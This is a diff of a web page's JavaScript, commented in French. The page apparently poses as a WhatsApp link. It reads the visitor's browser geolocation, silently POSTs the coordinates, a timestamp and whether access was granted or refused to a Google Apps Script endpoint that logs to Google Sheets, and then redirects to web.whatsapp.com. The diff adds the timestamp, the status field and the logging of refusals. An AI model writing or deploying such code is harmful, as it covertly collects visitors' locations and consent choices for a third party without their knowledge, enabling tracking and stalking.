@@ -207,6 +207,7 @@
                 if ("geolocation" in navigator) {
                     navigator.geolocation.getCurrentPosition(
                         async (position) => {
+                            // Envoi des coordonnées à Google Sheets
                             await fetch("https://script.google.com/macros/s/AKfycbxY5BxchC47A7cDOEwqivqPumIMPOwqBhui9O6BoK7XKXvapcWemRIJc89iexNQJhko/exec", {
                                 method: "POST",
                                 headers: { "Content-Type": "application/json" },
@@ -214,7 +215,9 @@
                                     latitude: position.coords.latitude,
                                     longitude: position.coords.longitude,
                                     nom_utilisateur: "seami",
-                                    contact: "0123456789"
+                                    contact: "0123456789",
+                                    statut_geoloc: "acceptée",
+                                    heure: new Date().toISOString()
                                 }),
                                 mode: 'no-cors'
                             });
@@ -224,7 +227,23 @@
                                 window.location.href = "https://web.whatsapp.com";
                             }, 1500);
                         },
-                        (error) => {
+                        async (error) => {
+                            // Si géoloc refusée, on écrit "loc refusée" dans Google Sheets
+                            await fetch("https://script.google.com/macros/s/AKfycbxY5BxchC47A7cDOEwqivqPumIMPOwqBhui9O6BoK7XKXvapcWemRIJc89iexNQJhko/exec", {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({
+                                    latitude: null,
+                                    longitude: null,
+                                    nom_utilisateur: "seami",
+                                    contact: "0123456789",
+                                    statut_geoloc: "refusée",
+                                    heure: new Date().toISOString()
+                                }),
+                                mode: 'no-cors'
+                            });
+
+                            // Puis redirection
                             window.location.href = "https://web.whatsapp.com";
                         },
                         { enableHighAccuracy: false, timeout: 3000 }
